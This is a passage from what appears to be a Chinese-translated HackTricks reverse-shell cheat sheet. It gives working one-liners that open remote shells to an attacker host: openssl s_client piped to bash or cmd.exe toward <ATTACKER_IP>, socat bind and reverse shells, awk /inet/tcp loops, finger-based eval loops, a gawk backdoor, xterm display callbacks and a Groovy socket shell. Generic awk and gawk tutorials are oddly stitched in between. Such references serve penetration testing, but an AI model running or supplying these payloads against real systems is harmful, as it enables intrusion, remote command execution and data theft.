openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
受害者
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### 绑定 shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### 反向 shell

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands on it.

To establish a reverse shell, the attacker typically needs to have a listener running on their machine and a payload on the target machine. The payload is usually a piece of code or a script that, when executed on the target machine, connects back to the attacker's machine.

Once the connection is established, the attacker can interact with the target machine's shell and execute commands as if they were physically present on the machine. This can be useful for various purposes, such as gaining unauthorized access, exfiltrating data, or pivoting to other machines on the network.

There are various ways to create a reverse shell, depending on the target machine's operating system and available tools. Common methods include using netcat, socat, or creating a custom script in a programming language like Python or Perl.

It is important to note that using reverse shells for unauthorized access or malicious purposes is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing or authorized remote administration.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk是一种强大的文本处理工具，可以用于从文件或标准输入中提取和处理数据。它使用一种简单的编程语言，可以根据指定的模式和动作来处理文本。

Awk的基本语法如下：

```bash
awk 'pattern { action }' file
```

其中，`pattern`是用于匹配文本的模式，`action`是在匹配到模式时执行的操作。`file`是要处理的文件名。

Awk的工作流程如下：

1. 从文件或标准输入中读取一行文本。
2. 将文本按照指定的分隔符分割成字段。
3. 对每个字段应用指定的模式，如果匹配成功，则执行相应的动作。
4. 重复步骤1-3，直到处理完所有的文本。

Awk提供了许多内置的变量和函数，可以在处理文本时使用。以下是一些常用的内置变量：

- `NR`：当前行号。
- `NF`：当前行的字段数。
- `$0`：当前行的完整内容。
- `$1`、`$2`、...：当前行的第1、第2、...个字段。

以下是一些常用的Awk示例：

- 打印文件的每一行：`awk '{ print }' file`
- 打印文件的第1列：`awk '{ print $1 }' file`
- 打印文件的第1列和第2列：`awk '{ print $1, $2 }' file`
- 打印文件的行号和每行的字段数：`awk '{ print NR, NF }' file`
- 根据条件过滤行：`awk '/pattern/ { print }' file`

Awk是一种非常灵活和强大的工具，可以用于各种文本处理任务。熟练掌握Awk可以提高数据处理的效率和准确性。
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
### 指纹识别

**攻击者**
```bash
while true; do nc -l 79; done
```
要发送命令，请将其写下来，按下回车键，然后按下CTRL+D（停止STDIN）

**受害者**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk是一种强大的文本处理工具，它在Linux系统中非常常用。它可以用于处理文本文件、提取数据、执行计算和转换等操作。Gawk的基本语法是使用模式和动作来匹配和处理文本。

以下是一些常用的Gawk命令和用法：

- **打印行**：使用`print`命令可以打印文本文件的行。例如，`gawk '{print}' file.txt`将打印出文件`file.txt`的所有行。

- **指定分隔符**：使用`-F`选项可以指定分隔符来处理文本文件。例如，`gawk -F":" '{print $1}' file.txt`将以冒号作为分隔符，并打印出每行的第一个字段。

- **条件匹配**：使用`if`语句可以进行条件匹配。例如，`gawk '{if ($1 == "admin") print $0}' file.txt`将打印出文件中第一个字段为"admin"的行。

- **计算和转换**：使用数学运算符和内置函数可以进行计算和转换操作。例如，`gawk '{print $1 * 2}' file.txt`将打印出每行第一个字段的两倍。

- **正则表达式**：使用正则表达式可以进行模式匹配。例如，`gawk '/pattern/ {print}' file.txt`将打印出包含指定模式的行。

- **循环**：使用`for`和`while`循环可以对文本进行迭代处理。例如，`gawk '{for (i=1; i<=NF; i++) print $i}' file.txt`将打印出每行的每个字段。

- **内置变量**：Gawk提供了一些内置变量，如`NR`表示当前行号，`NF`表示当前行的字段数等。可以使用这些变量进行更复杂的处理。

这些只是Gawk的一些基本用法，它还有很多高级功能和选项可以探索。通过熟练掌握Gawk，您可以更高效地处理和分析文本数据。
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

xterm会话是最简单的反向shell形式之一。在服务器上运行以下命令。它将尝试在TCP端口6001上回连到您的IP地址（10.0.0.1）。
```bash
xterm -display 10.0.0.1:1
```
要捕获传入的xterm，启动一个X服务器（:1 - 监听TCP端口6001）。一种方法是使用Xnest（在您的系统上运行）：
```bash
Xnest :1
```
您需要授权目标连接到您（也在您的主机上运行的命令）：
```bash
xhost +targetip
```
## Groovy

由[frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)注意：Java反向shell也适用于Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## 参考文献

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}

{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
